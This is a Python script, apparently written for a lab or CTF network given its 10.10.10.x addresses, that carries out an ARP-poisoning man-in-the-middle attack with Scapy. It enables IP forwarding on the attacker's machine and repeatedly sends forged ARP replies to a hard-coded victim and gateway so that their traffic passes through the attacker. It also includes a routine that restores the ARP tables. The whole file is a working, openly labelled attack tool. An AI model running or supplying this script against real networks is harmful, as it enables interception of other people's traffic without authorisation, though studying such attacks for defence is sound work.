from scapy.all import *
import sys
import os
import time

try:
	interface = 'eth0' # Network interface to use for the attack
	victimIP = '10.10.10.197' 
	#gate ip: the gateway IP which the attacker will try to spookf
	gateIP = '10.10.10.1' 
except KeyboardInterrupt:
	print("\n[*] User Requested Shutdown")
	print("[*] Exiting...")
	sys.exit(1) # Exit the script if there's a keyboard interrupt

print("\n[*] Beginning IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Enable IP forwarding on the attacker's machine

def get_mac(IP):
	conf.verb = 0 #turn off verbose mode in Scapy
	# Send an ARP request to get the MAC address associated with the given IP
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%") #Return the MAC address from the response

def reARP():
	# Function to restore the ARP tables of the victim and gateway to their correct values
	print("\n[*] Restoring Targets...")
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	#Restore the gateway's ARP table
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	#Restore victim's ARP table
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print("[*] Stopping IP Forwarding...")
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print("[*] Shutting Down...")
	sys.exit(1)

def trick(gm, vm):
	# Function to poison the ARP tables of the victim and the gateway
	# Spoof the victim's ARP table to make it think the gateway's MAC is the attacker's MAC
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
	# Spoof the gateway's ARP table to make it think the victim's MAC is the attacker's MAC
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

# Perfrom the ARP poisoning (MitM) attack
def mitm():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		# If unable to get the victim's MAC, stop IP forwarding and exit
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
		print("[!] Couldn't Find Victim MAC Address")
		print("[!] Exiting...")
		sys.exit(1)
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
		print("[!] Couldn't Find Gateway MAC Address")
		print("[!] Exiting...")
		sys.exit(1)
	print("[*] Poisoning Victims...")	
	while 1: # COntinuosly perform the ARP poisoning attack
		try:
			trick(gateMAC, victimMAC)
			time.sleep(0.5) #Pause for half a second before the next round of poisoning
		except KeyboardInterrupt:
			reARP()
			break
mitm()
